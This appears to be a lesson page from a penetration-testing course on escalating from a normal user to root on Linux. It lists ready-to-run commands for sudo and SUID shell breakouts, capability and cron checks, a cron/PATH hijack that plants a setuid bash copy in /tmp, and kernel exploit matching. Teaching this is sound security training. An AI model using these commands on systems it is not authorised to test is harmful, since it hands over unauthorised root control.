---
title: Escalate to root on Linux
slug: linux-privesc
area: linux
module: 8
order: 2
goal: Go from a standard user to root using the common local misconfigurations.
summary: How to escalate on Linux — check sudo rights and GTFOBins, SUID/SGID binaries, capabilities, writable cron and PATH, and kernel exploits, after letting an enumeration script point the way.
prereqs: [A shell as a non-root user, A TTY you can run commands in, linpeas or similar to enumerate quickly]
seeAlso: [tool:linux-privesc, tool:peass, map:linux, map:start]
references:
  - GTFOBins | https://gtfobins.github.io/
  - HackTricks: Linux privilege escalation | https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
---

Linux privesc is a checklist of independent routes — any one is enough. Run an enumeration script first, then work the hits. The fastest wins are almost always **sudo** and **SUID**.

## Enumerate first

```bash
sudo -l                                   # what can you run as root, maybe passwordless?
id; uname -a                              # groups and kernel version
./linpeas.sh | tee linpeas.out            # full sweep, read the red/yellow hits
```

## sudo + GTFOBins

If `sudo -l` lists a binary, check GTFOBins for its sudo breakout.

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo /usr/bin/vim -c ':!/bin/sh'
# LD_PRELOAD / env_keep set? abuse it per GTFOBins
```

## SUID / SGID binaries

A root-owned SUID binary runs as root — if it's on GTFOBins, that's a shell.

```bash
find / -perm -4000 -type f 2>/dev/null     # SUID
find / -perm -2000 -type f 2>/dev/null     # SGID
# e.g. SUID find: find . -exec /bin/sh -p \; -quit
```

## Capabilities, cron and PATH

```bash
getcap -r / 2>/dev/null                    # cap_setuid+ep on python/perl = instant root
cat /etc/crontab; ls -la /etc/cron.*       # a root job calling a file you can write
echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' > writable_script.sh   # cron/PATH hijack
```

## Kernel exploit (last resort)

```bash
./linux-exploit-suggester.sh               # match the kernel to a CVE (PwnKit, DirtyPipe…)
```

## If it fails

- **sudo asks for a password you don't have**: look for `NOPASSWD` entries only, or another route — don't burn the account on lockout.
- **SUID binary not on GTFOBins**: check its version for a known CVE, or whether it calls a relative-path binary you can hijack via PATH.
- **Found a writable cron but it never runs as root**: confirm the owner and schedule — a user cron won't give root.
- **Kernel exploit panics the box**: risky and loud; prefer config-based routes, and only run kernel PoCs with authorisation.

## Verify

```bash
id                 # uid=0(root)
# or from a +s shell: /tmp/b -p ; then id
```
